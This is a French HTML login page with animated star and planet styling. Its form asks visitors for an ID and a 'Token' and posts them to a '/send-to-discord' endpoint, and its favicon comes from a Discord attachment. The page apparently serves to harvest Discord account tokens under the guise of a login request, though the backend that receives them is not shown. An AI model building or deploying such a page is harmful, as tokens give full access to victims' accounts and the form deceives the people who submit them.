<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KSW login</title>
    <link rel="icon" href="https://cdn.discordapp.com/attachments/1307748864211812373/1321614560460931152/IMG_5977.jpg?ex=676de0f9&is=676c8f79&hm=2a64cfafcf8ef1a396922512b2cea8961047538f5b1b0a7038d954ce2b8fcf86&" type="image/x-icon">
    <style>
        /* Appliquer un fond dégradé violet */
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #6a0dad, #9b59b6); /* Dégradé de violet */
        }

        /* Animation de particules pour créer un fond "Galaxie" */
        .background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: transparent;
            z-index: -1;
            pointer-events: none;
            overflow: hidden;
        }

        /* Création des étoiles animées */
        .star {
            position: absolute;
            background-color: white;
            border-radius: 50%;
            animation: twinkle 1.5s infinite alternate;
        }

        @keyframes twinkle {
            0% {
                opacity: 0.5;
            }
            100% {
                opacity: 1;
            }
        }

        /* Planètes améliorées avec un effet 3D et des dégradés */
        .planet {
            position: absolute;
            border-radius: 50%;
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.6); /* Ombre pour donner un effet lumineux */
            animation: rotatePlanet 60s linear infinite;
        }

        @keyframes rotatePlanet {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        /* Planète 1 - Dégradé doré avec une lumière douce */
        .planet1 {
            width: 90px;
            height: 90px;
            top: 15%;
            left: 20%;
            background: radial-gradient(circle, #f39c12, #e67e22);
            animation-duration: 50s;
            box-shadow: 0 0 20px rgba(243, 156, 18, 0.8);
        }

        /* Planète 2 - Dégradé bleu avec un effet de brillance */
        .planet2 {
            width: 120px;
            height: 120px;
            top: 40%;
            left: 60%;
            background: radial-gradient(circle, #2980b9, #1abc9c);
            animation-duration: 55s;
            box-shadow: 0 0 25px rgba(41, 128, 185, 0.6);
        }

        /* Planète 3 - Dégradé violet avec effet de lumière brillante */
        .planet3 {
            width: 100px;
            height: 100px;
            top: 70%;
            left: 80%;
            background: radial-gradient(circle, #8e44ad, #9b59b6);
            animation-duration: 65s;
            box-shadow: 0 0 30px rgba(142, 68, 173, 0.7);
        }

        /* Animation pour déplacer les étoiles */
        .background {
            animation: moveBackground 60s linear infinite;
        }

        @keyframes moveBackground {
            0% { transform: translateX(0); }
            100% { transform: translateX(-100%); }
        }

        /* Conteneur du formulaire */
        .container {
            background-color: rgba(255, 255, 255, 0.9);
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 15px 35px rgba(255, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
            text-align: center;
            z-index: 1;
        }

        /* Titre du formulaire */
        h1 {
            font-size: 2rem;
            margin-bottom: 30px;
            color: #333;
            font-weight: 600;
        }

        /* Style des champs de formulaire */
        .input-group {
            margin-bottom: 25px;
            text-align: left;
            position: relative;
        }

        label {
            font-size: 1rem;
            display: block;
            margin-bottom: 8px;
            color: #333;
            transition: color 0.3s ease-in-out;
        }

        input, textarea {
            width: 100%;
            padding: 12px;
            border-radius: 10px;
            border: 2px solid #ccc;
            background-color: #f3f3f3;
            color: #333;
            font-size: 1rem;
            box-sizing: border-box;
            transition: all 0.3s ease-in-out;
        }

        input:focus, textarea:focus {
            outline: none;
            border-color: #4e89f1;
            box-shadow: 0 0 10px rgba(78, 137, 241, 0.6);
        }

        textarea {
            resize: vertical;
            min-height: 100px;
        }

        /* Animation des étiquettes */
        input:focus + label, textarea:focus + label {
            top: -12px;
            left: 10px;
            font-size: 0.9rem;
            color: #4e89f1;
        }

        /* Style du bouton */
        button {
            background-color: #4e89f1;
            color: #fff;
            border: none;
            padding: 15px 25px;
            font-size: 1.2rem;
            border-radius: 10px;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.3s ease-in-out;
        }

        /* Effet au survol du bouton */
        button:hover {
            background-color: #3e75d6;
            transform: scale(1.1);
        }

        button:active {
            background-color: #3560a6;
        }

    </style>
</head>
<body>
    <div class="background">
        <!-- Création d'étoiles animées -->
        <div class="star" style="top: 10%; left: 20%; width: 5px; height: 5px;"></div>
        <div class="star" style="top: 40%; left: 70%; width: 3px; height: 3px;"></div>
        <div class="star" style="top: 70%; left: 50%; width: 4px; height: 4px;"></div>
        <div class="star" style="top: 30%; left: 90%; width: 6px; height: 6px;"></div>
        <div class="star" style="top: 80%; left: 20%; width: 3px; height: 3px;"></div>
        <div class="star" style="top: 20%; left: 60%; width: 4px; height: 4px;"></div>

        <!-- Planètes animées avec dégradés et effets de lumière -->
        <div class="planet planet1"></div>
        <div class="planet planet2"></div>
        <div class="planet planet3"></div>
    </div>

    <div class="container">
        <h1>Demande de Login</h1>
        <form id="discordForm">
            <div class="input-group">
                <label for="username">Id :</label>
                <input type="text" id="username" name="username" required>
            </div>

            <div class="input-group">
                <label for="message">Token :</label>
                <textarea id="message" name="message" required></textarea>
            </div>

            <button type="submit">Envoyer</button>
        </form>
    </div>

    <script>
        document.getElementById("discordForm").addEventListener("submit", function(event){
            event.preventDefault();
            const data = {
                username: document.getElementById("username").value,
                message: document.getElementById("message").value
            };
            fetch("/send-to-discord", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                alert("Message envoyé !");
            })
            .catch(error => {
                alert("Erreur lors de l'envoi");
            });
        });
    </script>
</body>
</html>
